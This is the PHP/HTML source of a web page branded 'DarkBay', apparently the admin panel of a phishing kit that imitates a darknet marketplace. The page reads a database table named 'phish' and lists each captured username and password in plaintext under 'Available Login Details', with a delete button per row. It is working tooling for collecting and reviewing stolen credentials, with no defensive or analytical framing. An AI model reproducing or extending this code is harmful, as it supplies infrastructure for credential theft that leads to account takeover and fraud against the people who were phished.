<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="app.css">
  <link rel="stylesheet" href="css/all.css">
   <link rel="stylesheet" href="css/fontawesome.css">
  




  <title>DarkBay</title>
  <link rel="shortcut icon" href="favicon.png">
  <style type="text/css">
    
  </style>
</head>
<body class="pb-4">
  <a class="" href="index.php"><img src="dbsmall.png"></a>
  <nav class="navbar navbar-expand-sm navbar-dark bg-mgray">
    <div class="container">
      <input type="checkbox" id="navbar-toggle-cbox"> <label class="navbar-toggler" for="navbar-toggle-cbox" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></label>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav flex-row"></ul>
        <ul class="navbar-nav"></ul><a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href="signup.php"><b>Register</b></a> <a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href=""><b>Forum</b></a> <a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href=""><b>Verify Mirror</b></a>
      </div>
    </div>
  </nav>
  <div class="container">
    <div class="mt-3">
      <div id="jswarning"></div>
    </div>

    <div class="mt-4">
      <div class="row mt-5 justify-content-center">
    
        <div class="col-md-11">

        </div><br>
        <br>
        <br>
        <br>
        <div class="col-md-10">
          <br>
        </div>
        <div class="col-md-10">
          <div class="card">
            <div class="card-header bg-light">
              <font color="white"><i class="fas fa-sign-in-alt"></i> <b>Available Login Details</b></font>
            </div>
            <div class="card-body">
              <p style="font-size:12px"></p>
              <center>
                <div class="col-md-8">
                  <div class="mt-3">
                            <table class="table table-striped">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>
                 <?php
                                    include 'conn.php';
// Check connection
                                    if (!$link) {
                                        die("Connection failed: " . mysqli_connect_error());
                                    }

                                    $sql = "SELECT * FROM phish";
                                    $result = mysqli_query($link, $sql);

                                    if (mysqli_num_rows($result) > 0) {
    // output data of each row
                                        while($row = mysqli_fetch_assoc($result)) {?>
                                          
                                                <tr>
                                                    <td><?php echo $row["username"] ?></td>
                                                    <td>$ <?php echo $row["password"] ?></td>
                                                 
                                                    <td><a class="btn btn-danger" href="delete_track.php?id=<?php echo $row["user_id"]; ?>">
                                                        <i class="glyphicon glyphicon-trash icon-white"></i>
                                                        Delete
                                                    </a>
                                             
                                                </td>
                                            </tr>


                                      
                                        <?php 

                                    }
                                } else {
                                    echo "0 results";
                                }

                                mysqli_close($link);
                                ?>
    </tbody>
  </table>
                
                  </div>
                </div>
              </center>
            </div>
        
          </div>
        </div>
        <div class="col-md-11">
          <br>
        </div><br>
        <div class="col-md-11">
      
        </div>
      </div>
    </div><br>
    <br>
    <br>
    <footer class="page-footer font-small blue">
      <div class="footer-copyright text-center py-3">
        Copyright: <i class="far fa-copyright"></i> 2019 DarkBay
      </div>

    </footer>
  </div>
</body>
</html>
